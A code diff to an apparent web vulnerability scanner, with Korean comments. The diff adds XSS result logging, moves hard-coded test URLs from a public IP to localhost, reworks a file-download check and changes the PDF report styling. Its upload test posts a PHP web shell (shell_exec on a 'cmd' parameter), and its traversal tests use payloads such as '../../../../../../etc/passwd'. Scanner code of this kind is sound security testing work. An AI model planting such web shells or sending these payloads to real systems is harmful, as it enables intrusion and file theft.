@@ -8,12 +8,13 @@ import concurrent.futures
 import os
 import itertools
 import json
-from reportlab.pdfgen import canvas
-from reportlab.pdfbase import pdfmetrics
+from reportlab.lib import colors
+from reportlab.lib.pagesizes import letter
+from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Preformatted
 from reportlab.pdfbase.ttfonts import TTFont
+from reportlab.pdfbase import pdfmetrics
 from reportlab.lib.pagesizes import A4
-from reportlab.platypus import Paragraph, SimpleDocTemplate, Spacer
-from reportlab.lib.styles import getSampleStyleSheet
 
 # 로깅 설정
 logging.basicConfig(level=logging.INFO)
@@ -68,6 +69,7 @@ class WebScanner:
         self.crawl(self.base_url, self.depth)
 
         sql_injection_results = []
+        xss_results = []
 
         # 보안 검사 병렬 수행
         with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
@@ -83,12 +85,18 @@ class WebScanner:
                     if not sql_injection_results:
                         sql_injection_results.append(result)
                         self.results.append(result)
+                elif result and result["type"] == "XSS":
+                    if not xss_results:
+                        xss_results.append(result)
+                        self.results.append(result)
                 elif result:
                     self.results.append(result)
 
-        # 로그에 최초로 발견된 SQL 인젝션 취약점만 기록
+        # 로그에 최초로 발견된 SQL 인젝션 취약점과 XSS 취약점만 기록
         if sql_injection_results:
             logger.info(sql_injection_results[0])
+        if xss_results:
+            logger.info(xss_results[0])
 
         # 기타 보안 점검 동기적으로 수행
         info_disclosure_result = self.check_information_disclosure(self.base_url)
@@ -245,9 +253,8 @@ class WebScanner:
 
         return False
 
-    # 그냥 검사하면 시간이 너무 오래 걸려서, 일단 받는 url이 write_post.php 일 때만 실행하게 하였습니다
     def check_stored_xss(self, url, method, inputs):
-        form_url = "http://211.52.42.82//Test_Page_Patch//write_post.php"  # 고정된 URL 사용
+        form_url = "http://127.0.0.1/write_post.php"  # 고정된 URL 사용
         session = requests.Session()
 
         def submit_form(payload):
@@ -267,7 +274,7 @@ class WebScanner:
         def is_stored_xss_detected(response_text, payload):
             return payload in response_text
 
-        stored_xss_test_page = "http://211.52.42.82//Test_Page_Patch//board.php"  # 고정된 URL 사용
+        stored_xss_test_page = "http://127.0.0.1/board.php"  # 고정된 URL 사용
         for payload in self.xss_payloads:
             response = submit_form(payload)
             if response:
@@ -446,12 +453,12 @@ class WebScanner:
 
 
     def check_file_upload(self, url):
-        form_url = "http://211.52.42.82//Test_Page_Patch//write_post.php"  # 고정된 URL 사용
+        form_url = "http://127.0.0.1/write_post.php"  # 고정된 URL 사용
         session = requests.Session()
 
         web_shell_file = {'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>')}
         file_name = 'shell.php'
-        check_url = "http://211.52.42.82//Test_Page_Patch//board.php"  # 고정된 URL 사용
+        check_url = "http://127.0.0.1/board.php"  # 고정된 URL 사용
         
         def submit_form(files, data):
             try:
@@ -470,15 +477,11 @@ class WebScanner:
             except requests.RequestException as e:
                 logger.error(f"Error verifying uploaded file at {check_url}: {e}")
             return False
-
-        # 폼 데이터 준비
         data = {
             'title': 'shell',
             'writer': 'shell',
             'content': 'shell'
         }
-
-        # form_url에서 파일 업로드 필드 확인
         try:
             response = session.get(form_url, timeout=10)
             response.raise_for_status()
@@ -494,7 +497,7 @@ class WebScanner:
         response = submit_form(web_shell_file, data)
         if response:
             try:
-                time.sleep(2)  # 데이터가 저장될 시간을 주기 위해 잠시 대기
+                time.sleep(2)
                 if verify_upload(check_url, 'shell'):
                     result = {
                         "type": "File Upload",
@@ -509,42 +512,45 @@ class WebScanner:
 
 
     def check_file_download(self, url):
-        # 원래라면 이게 맞을 것 같은데 현재 다운로드 페이지가 이게 맞는지 모르겠어서...테스트는 못하고 작성했습니다
+        form_url = "http://127.0.0.1/download.php"
         try:
-            response = session.get(url, timeout=10)
+            response = session.get(form_url, timeout=10)
             response.raise_for_status()
             soup = BeautifulSoup(response.text, 'html.parser')
-            download_links = soup.find_all('a', href=True)
 
-            for link in download_links:
-                href = link.get('href')
-                if 'filename=' in href:
-                    download_url = urljoin(self.base_url, href)
-                    if self.check_url_existence(download_url):
-                        logger.info(f"Valid file download link detected at {download_url}")
+            forms = soup.find_all('form')
+            for form in forms:
+                action = form.get('action')
+                method = form.get('method', 'get').lower()  # 메서드는 'get'으로 설정
+                inputs = form.find_all('input')
 
-                        parsed_url = urlparse(download_url)
-                        params = parse_qs(parsed_url.query)
-                        params['filename'] = '../../../../../../etc/passwd'
-                        modified_query = urlencode(params, doseq=True)
-                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
-                        
-                        try:
-                            test_response = session.get(test_url, timeout=10)
-                            if test_response.status_code == 200 and 'root:' in test_response.text:
-                                result = {
-                                    "type": "File Download",
-                                    "url": test_url,
-                                    "payload": 'filename=../../../../../../etc/passwd'
-                                }
-                                return result
-                        except requests.RequestException as e:
-                            logger.error(f"Error during file download test request to {test_url}: {e}")
+                if any(input.get('name') for input in inputs):
+                    data = {input.get('name'): 'uploads/../join.php' for input in inputs if input.get('type') == 'text'}
+
+                    form_action_url = urljoin(form_url, action)  # 기본 URL과 결합
+
+                    try:
+                        if method == 'post':
+                            download_response = session.post(form_action_url, data=data, timeout=10)
+                        else:
+                            download_response = session.get(form_action_url, params=data, timeout=10)
+
+                        # 파일 다운로드 응답 확인
+                        if download_response.status_code == 200:
+                            result = {
+                                "type": "File Download",
+                                "url": form_action_url,
+                                "payload": 'uploads/../join.php'
+                            }
+                            return result
+                    except requests.RequestException as e:
+                        logger.error(f"Error during file download test request to {form_action_url}: {e}")
 
             return False
         except requests.RequestException as e:
-            logger.error(f"Error during request to {url}: {e}")
+            logger.error(f"Error during request to {form_url}: {e}")
             return False
+
     
     def generate_report(self):
         output_directory = 'reports'
@@ -559,28 +565,18 @@ class WebScanner:
         
         pdfmetrics.registerFont(TTFont("MalgunGothic", "malgun.ttf"))  # 한글 폰트 등록
         styles = getSampleStyleSheet()
-        styles['Normal'].fontName = 'MalgunGothic'
+        styles.add(ParagraphStyle(name='Normal_Korean', fontName='MalgunGothic'))
 
         title = Paragraph(f"Security Report for {self.base_url}", styles['Title'])
         elements.append(title)
         elements.append(Spacer(1, 12))
 
-        # 중복된 SQL 인젝션 리절트 제거
-        unique_results = []
-        seen_sql_injections = set()
         for result in self.results:
-            if result['type'] == 'SQL Injection':
-                key = (result['url'], result['payload'])
-                if key not in seen_sql_injections:
-                    seen_sql_injections.add(key)
-                    unique_results.append(result)
-            else:
-                unique_results.append(result)
-
-        for result in unique_results:
-            elements.append(Paragraph(f"Vulnerability Type: {result['type']}", styles['Normal']))
-            elements.append(Paragraph(f"URL: {result['url']}", styles['Normal']))
-            elements.append(Paragraph(f"Payload: {result['payload']}", styles['Normal']))
+            elements.append(Paragraph(f"Vulnerability Type: {result['type']}", styles['Normal_Korean']))
+            elements.append(Paragraph(f"URL: {result['url']}", styles['Normal_Korean']))
+            
+            # Use Preformatted for payload
+            elements.append(Preformatted(f"Payload: {result['payload']}", styles['Normal_Korean']))
             elements.append(Spacer(1, 12))
 
             guide = self.load_guide(result['type'])
@@ -589,7 +585,7 @@ class WebScanner:
                     guide_text = self.flatten_guide_dict(guide)
                 else:
                     guide_text = guide
-                elements.append(Paragraph(guide_text, styles['Normal']))
+                elements.append(Paragraph(guide_text, styles['Normal_Korean']))
                 elements.append(Spacer(1, 12))
 
         doc.build(elements)
